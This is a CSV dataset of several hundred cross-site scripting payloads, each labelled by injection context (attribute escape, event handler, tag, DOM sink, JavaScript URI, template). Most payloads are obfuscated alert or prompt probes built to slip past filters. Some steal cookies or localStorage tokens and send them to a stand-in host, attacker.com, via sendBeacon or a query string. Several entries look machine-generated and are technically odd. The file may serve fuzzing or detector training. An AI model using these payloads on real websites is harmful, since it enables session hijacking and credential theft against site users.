payload,context
onblur=j&#97;v&#97;script:consol&#101;.log(docum&#101;nt.dom&#97;in),event_handler
' onvolumechange=confirm('XSS') ',attribute_escape
"\"" OnhAshChaNge=coNfiRm(DocUmeNt.DomAin)//",attribute_escape
\' onkeydown=alert(location.hash)//,attribute_escape
%3Clink oninput=alert(document.domain) oninput=alert(document.domain)%3E,tag_injection
' ><svg onb&#101;gin=consol&#101;.log(loc&#97;tion.h&#97;sh)>,attribute_escape
"onpoint&#101;rmov&#101;=prompt/*x*/(String.fromCh&#97;rCod&#101;(88,83,83))",event_handler
"onlo&#97;d=prompt/**/(String.fromCh&#97;rCod&#101;(88,83,83))",event_handler
<title/onstalled=alert(%27XSS%27)>,tag_injection
' ><svg on&#97;nim&#97;tionc&#97;nc&#101;l=prompt(loc&#97;tion.h&#97;sh)>,attribute_escape
`%3E%3Cimg src=x ondragover=prompt(1)%3E,attribute_escape
\' on&#97;nim&#97;tionc&#97;nc&#101;l=prompt(loc&#97;tion.h&#97;sh)//,attribute_escape
<audio onscrollend=prompt(location.hash) onscrollend=prompt(location.hash)>,tag_injection
' ><svg onblur=console.log(document.domain)>,attribute_escape
<sp&#97;n/oncopy=prompt(loc&#97;tion.h&#97;sh)>,tag_injection
"' ontr&#97;nsitionst&#97;rt=confirm(String.fromCh&#97;rCod&#101;(88,83,83)) '",attribute_escape
%27 ><svg onpagehide=alert(location.hash)>,attribute_escape
"""><BodY oNgeStuResTarT=cOnsOle.loG(STriNg.FroMChArCOde(88,83,83))>",tag_injection
' onc&#97;npl&#97;y=confirm(loc&#97;tion.h&#97;sh) ',attribute_escape
"Object.assign(window,{%22onended%22:console.log})",dom_sink
' onk&#101;ypr&#101;ss=&#97;l&#101;rt('XSS') ',attribute_escape
"__proto__[""onanimationiteration""]=console.log(String.fromCharCode(88,83,83))",dom_sink
"OndRop=coNfiRm(StrIng.frOmCHarCodE(88,83,83))",event_handler
"""%3E%3Cimg src=x onfullscreenchange=alert(location.hash)%3E",attribute_escape
&quot; onerror=console.log(document.domain) x=&quot;,attribute_escape
"%27><img src=x onpointerdown=console.log(String.fromCharCode(88,83,83))>",attribute_escape
"JavAscRipT:%0acOnfIrm(StRinG.fRomChaRCoDe(88,83,83))",js_uri
'%3E%3Cimg src=x onerror=console.log(location.hash)%3E,attribute_escape
JavAscRipT:cOnsOle.loG/*X*/(doCumEnt.doMaiN),js_uri
"loc&#97;tion=""j&#97;v&#97;script:&#101;v&#97;l(1)""",dom_sink
%22 onpagereveal=console.log(document.domain) %22,attribute_escape
""" oNerRor=alErt(1) """,attribute_escape
{{$on.constructor(%27confirm(1)%27)()}},template_injection
%27 ><svg onmouseover=prompt(document.domain)>,attribute_escape
"ObjEct.asSigN(wIndOw,{""oNpaSte"":cOnfIrm})",dom_sink
"&#106;avascript:\u0061lert(String.fromCharCode(88,83,83))",js_uri
' oNmoUseDowN=aLerT(lOcaTioN.hAsh) ',attribute_escape
"' oNpoIntEruP=cOnfIrm(StRinG.fRomChaRCoDe(88,83,83)) '",attribute_escape
""" oNmoUseOveR=aLerT(STriNg.FroMChArCOde(88,83,83)) X=""",attribute_escape
\' ondrop=confirm(location.hash)//,attribute_escape
' %3E%3Csvg ontouchmove=prompt('XSS')%3E,attribute_escape
"document.body.innerHTML=""<img src=x onerror=\u0061lert(btoa(document.cookie))>""",dom_sink
\' onp&#97;g&#101;r&#101;v&#101;&#97;l=consol&#101;.log(docum&#101;nt.dom&#97;in)//,attribute_escape
&quOt; onWebKitAniMatIonEnd=prOmpT(1) x=&qUot;,attribute_escape
<form/onwebkitanimationend=prompt(%27XSS%27)>,tag_injection
<animatetransform onpointermove=console.log(%27XSS%27)>,tag_injection
onmous&#101;ov&#101;r=confirm&#40;docum&#101;nt.dom&#97;in&#41;,event_handler
%22><img src=x oncopy=console.log(location.hash)>,attribute_escape
'><img src=x ong&#101;stur&#101;&#101;nd=confirm('XSS')>,attribute_escape
"__proto__[%22oncopy%22]=eval(String.fromCharCode(88,83,83))",dom_sink
"%27 ondragover=console.log(String.fromCharCode(88,83,83)) %27",attribute_escape
%27><img src=x onpointerrawupdate=alert(%27XSS%27)>,attribute_escape
"DocUmeNt.BodY.iNneRHTML=""<iMg Src=x OneRroR=fEtcH(dOcuMenT.dOmaIn)>""",dom_sink
"on&#97;uxclick=prompt&#40;String.fromCh&#97;rCod&#101;(88,83,83)&#41;",event_handler
"<scr	ipt>window['alert'](String.fromCharCode(88,83,83))</scr	ipt>",script_injection
<script	>prompt(document.domain)</script>,script_injection
"\"" OneNd=AleRt('XSS')//",attribute_escape
<td srC=x onKeyUp=ConFirM(dOcuMenT.dOmaIn)>,tag_injection
""" onbegin=alert(String.fromCharCode(88,83,83)) """,attribute_escape
""" ><svg ongestureend=\u0061lert(1)>",attribute_escape
"<script	>&#97;l&#101;rt(String.fromCh&#97;rCod&#101;(88,83,83))</script>",script_injection
"Obj&#101;ct.&#97;ssign(window,{""onwh&#101;&#101;l"":consol&#101;.log})",dom_sink
 ondr&#97;gst&#97;rt=confirm(1),event_handler
" onfocusout=prompt(String.fromCharCode(88,83,83))",event_handler
\' onmous&#101;&#101;nt&#101;r=&#97;l&#101;rt(docum&#101;nt.dom&#97;in)//,attribute_escape
\' ontoggle=confirm('XSS')//,attribute_escape
<!--><t&#101;mpl&#97;t&#101; ons&#101;&#97;rch=consol&#101;.log(docum&#101;nt.dom&#97;in)>,tag_injection
' ondblclick=&#97;l&#101;rt(1) ',attribute_escape
OnbEfoRetOggLe=JavAscRipT:pRomPt('XSS'),event_handler
"__pRotO__[""oNdbLclIck""]=ConFirM(dOcuMenT.cOokIe+'&lOc='+lOcaTioN.hRef)",dom_sink
OncOpy=jaVasCriPt:ProMpt(1),event_handler
"java
scr	ipt:confirm(String.fromCharCode(88,83,83))",js_uri
"""><noscript ong&#101;stur&#101;st&#97;rt=&#97;l&#101;rt('XSS')>",tag_injection
location.href=%22javascript:fetch(document.domain)%22,dom_sink
"Object.assign(window,{""onpause"":confirm})",dom_sink
%27 onmousedown=confirm(1) %27,attribute_escape
"ObjEct.asSigN(wIndOw,{""oNauXclIck"":aLerT})",dom_sink
<&#97;nim&#97;t&#101;motion	on&#97;nim&#97;tionit&#101;r&#97;tion=consol&#101;.log('XSS')>,tag_injection
<&#101;mb&#101;d src=x onmous&#101;&#101;nt&#101;r=confirm('XSS')>,tag_injection
%22><img src=x onpromptaction=prompt(location.hash)>,attribute_escape
document.body.innerHTML=%22<img src=x onerror=prompt(localStorage.getItem(%27token%27))>%22,dom_sink
"%3Canimatemotion
ondrop=confirm(location.hash)%3E",tag_injection
'><img src=x onpause=confirm(document.domain)>,attribute_escape
"element.insertAdjacentHTML(""beforeend"",""<img src=x onerror=XMLHttpRequest(1)>"")",dom_sink
<scr	ipt onkeydown=confirm(document.domain)/>,tag_injection
'><img src=x onfullscr&#101;&#101;nch&#97;ng&#101;=&#97;l&#101;rt(loc&#97;tion.h&#97;sh)>,attribute_escape
\' onpopstate=alert('XSS')//,attribute_escape
{{7*%277%27}},template_injection
onwebkitfullscreenchange=\u0061lert&#40;document.domain&#41;,event_handler
`%3E%3Cimg src=x ontouchend=console.log(1)%3E,attribute_escape
""" ><svg onpopstate=alert(location.hash)>",attribute_escape
%22><img src=x onfocusout=console.log(location.hash)>,attribute_escape
"setTimeout(%22prompt(document.domain)%22,0)",dom_sink
"%3Cxmp
onmousewheel=prompt(String.fromCharCode(88,83,83))%3E",tag_injection
`%3E%3Cimg src=x onvolumechange=confirm('XSS')%3E,attribute_escape
"document.querySelector(""body"").innerHTML+=""fetch(location.hash)""",dom_sink
<div onpause=confirm(location.hash)/>,tag_injection
\' onfocusout=consol&#101;.log(loc&#97;tion.h&#97;sh)//,attribute_escape
"%3Cmeta
onpointerover=confirm(1)%3E",tag_injection
"\"" OngEstUreEnd=coNfiRm(LocAtiOn.HasH)//",attribute_escape
OnrEseT=cOnfIrm&#40;'XSS'&#41;,event_handler
"""%3E%3Cimg src=x ondragstart=console.log(location.hash)%3E",attribute_escape
"s&#101;tTim&#101;out(""&#97;l&#101;rt('//&#97;tt&#97;ck&#101;r.com/?c='+docum&#101;nt.cooki&#101;)"",0)",dom_sink
"__proto__[""onp&#97;us&#101;""]=confirm(n&#97;vig&#97;tor.s&#101;ndB&#101;&#97;con('//&#97;tt&#97;ck&#101;r.com',docum&#101;nt.cooki&#101;))",dom_sink
%3C!--%3E%3Cbase onpageswap=alert('XSS')%3E,tag_injection
"\"" OneNd=ConSolE.lOg('XSS')//",attribute_escape
' ><svg oncut=confirm('XSS')>,attribute_escape
<a src=x onsearch=\u0061lert(1)>,tag_injection
"\' on&#97;nim&#97;tionst&#97;rt=&#97;l&#101;rt(String.fromCh&#97;rCod&#101;(88,83,83))//",attribute_escape
" onvolum&#101;ch&#97;ng&#101;=&#97;l&#101;rt(String.fromCh&#97;rCod&#101;(88,83,83))",event_handler
&quot; onpointerrawupdate=prompt(%27XSS%27) x=&quot;,attribute_escape
"' ><svg ondblclick=\u0061lert(String.fromCharCode(88,83,83))>",attribute_escape
onkeydown=alert/***/('XSS'),event_handler
<boDy Src=x OnbEfoRecUt=ConFirM(dOcuMenT.dOmaIn)>,tag_injection
OnrEseT=pRomPt(1),event_handler
java	script:alert(document.domain),js_uri
"\' OnsCroLleNd=AleRt(StrIng.frOmCHarCodE(88,83,83))//",attribute_escape
onfocusout=javascr	ipt:confirm(1),event_handler
onpointerrawupdate=javascript:console.log(location.hash),event_handler
""" onblur=alert(location.hash) """,attribute_escape
"__pRotO__[""oNanImaTioNenD""]=coNsoLe.Log(doCumEnt.coOkiE)",dom_sink
\' onc&#97;npl&#97;y=prompt(docum&#101;nt.dom&#97;in)//,attribute_escape
"\"" on&#97;nim&#97;tion&#101;nd=confirm(loc&#97;tion.h&#97;sh)//",attribute_escape
on&#97;nim&#97;tionit&#101;r&#97;tion=j&#97;v&#97;script:confirm('XSS'),event_handler
\%22 onanimationend=confirm(1)//,attribute_escape
"WinDow[""XMLHTtpReqUesT""](loCalStoRagE.gEtITem('tOkeN'))",dom_sink
onblur=console.log/*x*/(1),event_handler
"\"" ontransitionend=\u0061lert(document.domain)//",attribute_escape
' oNauXclIck=prOmpT(lOcaTioN.hAsh) ',attribute_escape
""" ><svG oNfoCusOut=coNsoLe.Log(loCatIon.haSh)>",attribute_escape
"""><Img srC=x onCut=coNfiRm(1)>",attribute_escape
"""><Img srC=x onWebKitFulLscReeNchAngE=cOnsOle.loG(dOcuMenT.dOmaIn)>",attribute_escape
"element.setAttribute(%22onclick%22,%22eval(localStorage.getItem(%27token%27))%22)",dom_sink
"EvaL(""ProMpt(doCumEnt.doMaiN)"")",dom_sink
"<script>setTimeout('prompt(document.domain)',0)</script>",script_injection
"""><Img srC=x onTouChmOve=prOmpT('XSS')>",attribute_escape
' ><svg ontouchmov&#101;=consol&#101;.log(docum&#101;nt.dom&#97;in)>,attribute_escape
<blink src=x onmous&#101;up=&#97;l&#101;rt(1)>,tag_injection
"""><Img srC=x onPauSe=ConSolE.lOg(DocUmeNt.DomAin)>",attribute_escape
"%22 onanimationend=alert(String.fromCharCode(88,83,83)) %22",attribute_escape
"%22><noscript onbeforematch=confirm(String.fromCharCode(88,83,83))>",tag_injection
ongotpoint&#101;rc&#97;ptur&#101;=prompt/**/(loc&#97;tion.h&#97;sh),event_handler
'><img src=x onpagehide=prompt(document.domain)>,attribute_escape
""" onbeforetoggle=console.log('XSS') """,attribute_escape
<!--><&#97;r&#101;&#97; onlo&#97;d=consol&#101;.log(docum&#101;nt.dom&#97;in)>,tag_injection
%3Cmarquee onauxclick=confirm(location.hash) onauxclick=confirm(location.hash)%3E,tag_injection
"s&#101;tTim&#101;out(""XMLHttpR&#101;qu&#101;st(loc&#97;tion.h&#97;sh)"",0)",dom_sink
<td	onmozfullscreenchange=console.log(location.hash)>,tag_injection
"ongotpoint&#101;rc&#97;ptur&#101;=&#97;l&#101;rt/*x*/(String.fromCh&#97;rCod&#101;(88,83,83))",event_handler
"""%3E%3Cimg src=x onbeforepaste=alert(1)%3E",attribute_escape
""" ><svG oNplAyiNg=AleRt(LocAtiOn.HasH)>",attribute_escape
`><img src=x onmouseenter=alert(document.domain)>,attribute_escape
%3Cbase	onkeydown=alert('XSS')%3E,tag_injection
"Obj&#101;ct.&#97;ssign(window,{""oninput"":&#97;l&#101;rt})",dom_sink
'><Img srC=x onConTexTmeNu=AleRt(DocUmeNt.DomAin)>,attribute_escape
<&#97; onmozfullscr&#101;&#101;nch&#97;ng&#101;=&#97;l&#101;rt(loc&#97;tion.h&#97;sh)>,tag_injection
 onCliCk=ConFirM(1),event_handler
""" onh&#97;shch&#97;ng&#101;=&#97;l&#101;rt('XSS') """,attribute_escape
"\%22 ondblclick=alert(String.fromCharCode(88,83,83))//",attribute_escape
<scr	ipt>window['confirm'](location.hash)</scr	ipt>,script_injection
<SCRIPT>confirm(location.hash)</SCRIPT>,script_injection
#{{\u0061lert(document.domain)}},template_injection
 onpointermove=alert(%27XSS%27),event_handler
"DocUmeNt.BodY.iNneRHTML=""<iMg Src=x OneRroR=fEtcH(lOcaTioN.hAsh)>""",dom_sink
"docum&#101;nt.writ&#101;(""<img src=x on&#101;rror=&#97;l&#101;rt(bto&#97;(docum&#101;nt.cooki&#101;))>"")",dom_sink
<foRm OnwEbkIttRanSitIonEnd=prOmpT(lOcaTioN.hAsh)>,tag_injection
'><Img srC=x onWebKitFulLscReeNchAngE=aLerT('XSS')>,attribute_escape
%22 ><svg onbeforecut=confirm(1)>,attribute_escape
<liNk Src=x OndRop=prOmpT(dOcuMenT.dOmaIn)>,tag_injection
"eval(""alert(1)"")",dom_sink
"document.body.innerHTML=""%3Cimg src=x onerror=confirm(navigator.sendBeacon('//attacker.com',document.cookie))%3E""",dom_sink
' ><svg ontouch&#101;nd=consol&#101;.log('XSS')>,attribute_escape
""" oNgeStuResTarT=aLerT(lOcaTioN.hAsh) """,attribute_escape
\%27 onbeforepaste=prompt(1)//,attribute_escape
"""%3E%3Cscript%3Econsole.log(document.domain)%3C/script%3E",script_injection
%3Cscript	onkeydown=confirm(document.domain)%3E,tag_injection
"<m&#97;rqu&#101;&#101; x=y onclos&#101;=confirm(String.fromCh&#97;rCod&#101;(88,83,83))>",tag_injection
"__proto__[""onmousedown""]=console.log(location.hash)",dom_sink
\' OncOpy=coNsoLe.Log(loCatIon.haSh)//,attribute_escape
"SetIntErvAl(""coNfiRm(DocUmeNt.CooKie)"",100)",dom_sink
'><Img srC=x onProMptDisMisS=aLerT(dOcuMenT.dOmaIn)>,attribute_escape
"<maTh
OncOpy=coNsoLe.Log(doCumEnt.doMaiN)>",tag_injection
"`><Img srC=x onProMptActIon=coNfiRm(StrIng.frOmCHarCodE(88,83,83))>",attribute_escape
{{constructor.constructor('\u0061lert(1)')()}},template_injection
{{{&#97;l&#101;rt('XSS')}}},template_injection
"__proto__[""onmous&#101;&#101;nt&#101;r""]=consol&#101;.log(loc&#97;lStor&#97;g&#101;.g&#101;tIt&#101;m('tok&#101;n'))",dom_sink
"__proto__[%22onwebkitanimationend%22]=prompt(navigator.sendBeacon(%27//attacker.com%27,document.cookie))",dom_sink
"<script>setTimeout('prompt(String.fromCharCode(88,83,83))',0)</script>",script_injection
"__proto__[""ondr&#97;gov&#101;r""]=&#97;l&#101;rt(bto&#97;(docum&#101;nt.cooki&#101;))",dom_sink
' onscrollsn&#97;pch&#97;ng&#101;=consol&#101;.log(1) ',attribute_escape
' ondblclick=consol&#101;.log(loc&#97;tion.h&#97;sh) ',attribute_escape
\' on&#101;nd=consol&#101;.log('XSS')//,attribute_escape
""" ><svg on&#101;nd=consol&#101;.log('XSS')>",attribute_escape
"	onpoint&#101;rov&#101;r=prompt(String.fromCh&#97;rCod&#101;(88,83,83))",event_handler
"ondrop=javascr	ipt:confirm(String.fromCharCode(88,83,83))",event_handler
document.querySelector(%22body%22).innerHTML+=%22console.log(%27//attacker.com/?c=%27+document.cookie)%22,dom_sink
"docum&#101;nt.qu&#101;ryS&#101;l&#101;ctor(""body"").inn&#101;rHTML+=""prompt(docum&#101;nt.cooki&#101;+'&loc='+loc&#97;tion.hr&#101;f)""",dom_sink
<titl&#101;	onst&#97;ll&#101;d=&#97;l&#101;rt('XSS')>,tag_injection
onkeydown=javascript:confirm(1),event_handler
`%3E%3Cimg src=x onpointerdown=console.log(document.domain)%3E,attribute_escape
""" oNtoUchMovE=cOnfIrm(doCumEnt.doMaiN) """,attribute_escape
""" ><svG oNmoUseWheEl=ProMpt('XSS')>",attribute_escape
"LocAtiOn.HreF=""JavAscRipT:aLerT(1)""",dom_sink
"<!--><tr ontr&#97;nsition&#101;nd=prompt(String.fromCh&#97;rCod&#101;(88,83,83))>",tag_injection
onp&#97;us&#101;=j&#97;v&#97;script:consol&#101;.log(loc&#97;tion.h&#97;sh),event_handler
 onMouSeuP=cOnfIrm(doCumEnt.doMaiN),event_handler
<marquee x=y onpopstate=\u0061lert('XSS')>,tag_injection
 onmous&#101;wh&#101;&#101;l=consol&#101;.log('XSS'),event_handler
"\"" onpointermove=prompt('XSS')//",attribute_escape
"""%3E%3Cimg src=x onmousedown=console.log('XSS')%3E",attribute_escape
""" onsearch=\u0061lert('XSS') """,attribute_escape
 onwebkitanimationend=\u0061lert(1),event_handler
<m&#97;th ondr&#97;gov&#101;r=prompt(1)>,tag_injection
"""><img src=x onpointerup=confirm(String.fromCharCode(88,83,83))>",attribute_escape
onpointermove=console.log/***/(1),event_handler
onpause=prompt(location.hash),event_handler
"\"" OnpLayIng=alErt(StRinG.fRomChaRCoDe(88,83,83))//",attribute_escape
"JavA
sCriPt:AleRt(1)",js_uri
%3Cembed onwebkitfullscreenchange=confirm(location.hash)%3E,tag_injection
"OnfUllScrEenChaNge=coNsoLe.Log(StRinG.fRomChaRCoDe(88,83,83))",event_handler
"Obj&#101;ct.&#97;ssign(window,{""onp&#97;g&#101;show"":&#97;l&#101;rt})",dom_sink
"""><ScrIpt>prOmpT('XSS')</scRipT>",script_injection
"ObjEct.asSigN(wIndOw,{""oNvoLumEchAngE"":FetCh})",dom_sink
""" ><svg onpopst&#97;t&#101;=&#97;l&#101;rt('XSS')>",attribute_escape
"on&#97;nim&#97;tionit&#101;r&#97;tion=consol&#101;.log&#40;String.fromCh&#97;rCod&#101;(88,83,83)&#41;",event_handler
"\"" onplay=confirm('XSS')//",attribute_escape
ontransitionrun=confirm(1),event_handler
<a onkeypress=confirm(1) onkeypress=confirm(1)>,tag_injection
j&#97;v&#97;script:%0&#97;consol&#101;.log(loc&#97;tion.h&#97;sh),js_uri
' oNscRolLsnApcHanGe=ConSolE.lOg(LocAtiOn.HasH) ',attribute_escape
"&quot; ondragover=console.log(String.fromCharCode(88,83,83)) x=&quot;",attribute_escape
OnaNimAtiOneNd=ProMpt(1),event_handler
`><img src=x onpointermove=\u0061lert(document.domain)>,attribute_escape
OngOtpOinTerCapTurE=pRomPt/***/(lOcaTioN.hAsh),event_handler
%22 ><svg onbeforepaste=console.log(%27XSS%27)>,attribute_escape
ondrop=confirm/***/(document.domain),event_handler
"document.body.innerHTML=""<img src=x onerror=fetch(document.cookie)>""",dom_sink
\' OnaNimAtiOneNd=ConSolE.lOg('XSS')//,attribute_escape
\' oncont&#101;xtm&#101;nu=&#97;l&#101;rt(docum&#101;nt.dom&#97;in)//,attribute_escape
"<liStiNg
OnkEyuP=aLerT(lOcaTioN.hAsh)>",tag_injection
'><Img srC=x onSeaRch=coNfiRm(1)>,attribute_escape
%27 ><svg ontoggle=prompt(1)>,attribute_escape
"""%3E%3Cimg src=x onpointerover=confirm(String.fromCharCode(88,83,83))%3E",attribute_escape
%3Cmarquee x=y onauxclick=confirm(location.hash)%3E,tag_injection
onw&#101;bkit&#97;nim&#97;tion&#101;nd=j&#97;v&#97;script:confirm(docum&#101;nt.dom&#97;in),event_handler
""" onend=confirm(String.fromCharCode(88,83,83)) """,attribute_escape
	onAniMatIonEnd=alErt(1),event_handler
"' ><svG oNanImaTioNstArt=alErt(StRinG.fRomChaRCoDe(88,83,83))>",attribute_escape
"j&#97;v&#97;
script:consol&#101;.log(loc&#97;tion.h&#97;sh)",js_uri
%3C%= confirm(document.cookie) %%3E,template_injection
&quot; onkeypress=confirm(%27XSS%27) x=&quot;,attribute_escape
"setInterval(%22XMLHttpRequest(String.fromCharCode(88,83,83))%22,100)",dom_sink
J&#97;VasCriPt:ConFirM('XSS'),js_uri
'><script>\u0061lert(document.domain)</script>,script_injection
onlo&#97;d=confirm/***/(docum&#101;nt.dom&#97;in),event_handler
%22 ><svg ontoggle=confirm(%27XSS%27)>,attribute_escape
<dialog x=y onstalled=confirm('XSS')>,tag_injection
"d&#97;t&#97;:t&#101;xt/html,<script>consol&#101;.log('XSS')</script>",js_uri
<area onclose=prompt(1) onclose=prompt(1)>,tag_injection
%22 onclose=console.log(location.hash) %22,attribute_escape
"(new Function(""XMLHttpRequest('XSS')""))();",dom_sink
<title onblur=console.log(location.hash) onblur=console.log(location.hash)>,tag_injection
	onwebkittransitionend=alert(location.hash),event_handler
"\"" onchange=confirm(String.fromCharCode(88,83,83))//",attribute_escape
' %3E%3Csvg onclick=prompt('XSS')%3E,attribute_escape
'><img src=x onb&#101;for&#101;p&#97;st&#101;=prompt(1)>,attribute_escape
"<plaintext onpause=console.log(String.fromCharCode(88,83,83))>",tag_injection
' onanimationend=confirm(document.domain) ',attribute_escape
"onstalled=console.log/***/(String.fromCharCode(88,83,83))",event_handler
"<scr	ipt>setTimeout('confirm('XSS')',0)</scr	ipt>",script_injection
 onwaiting=confirm(document.domain),event_handler
{{prompt docum&#101;nt.dom&#97;in}},template_injection
"<script
onpoint&#101;rr&#97;wupd&#97;t&#101;=consol&#101;.log(docum&#101;nt.dom&#97;in)>",tag_injection
"%3Cbody
ongesturestart=console.log(String.fromCharCode(88,83,83))%3E",tag_injection
"__proto__[""onp&#97;us&#101;""]=&#101;v&#97;l(String.fromCh&#97;rCod&#101;(88,83,83))",dom_sink
`><img src=x onload=\u0061lert(1)>,attribute_escape
"&#101;l&#101;m&#101;nt.ins&#101;rtAdj&#97;c&#101;ntHTML(""b&#101;for&#101;&#101;nd"",""<img src=x on&#101;rror=confirm(loc&#97;tion.h&#97;sh)>"")",dom_sink
__${alErt(doCumEnt.coOkiE)}__::.x,template_injection
<SCRIPT>confirm('XSS')</SCRIPT>,script_injection
onpagereveal=confirm&#40;location.hash&#41;,event_handler
<!--><a onmozfullscreenchange=alert(location.hash)>,tag_injection
&quot; onreset=prompt(location.hash) x=&quot;,attribute_escape
"""%3E%3Cimg src=x onbeforetoggle=alert(location.hash)%3E",attribute_escape
<plAinTexT x=y OnpAgeRevEal=alErt(loCatIon.haSh)>,tag_injection
" onr&#101;p&#101;&#97;t=&#97;l&#101;rt(String.fromCh&#97;rCod&#101;(88,83,83))",event_handler
"\%22 onpageswap=console.log(String.fromCharCode(88,83,83))//",attribute_escape
""" onpointerover=console.log('XSS') """,attribute_escape
"""><iframe ontouchstart=prompt(String.fromCharCode(88,83,83))>",tag_injection
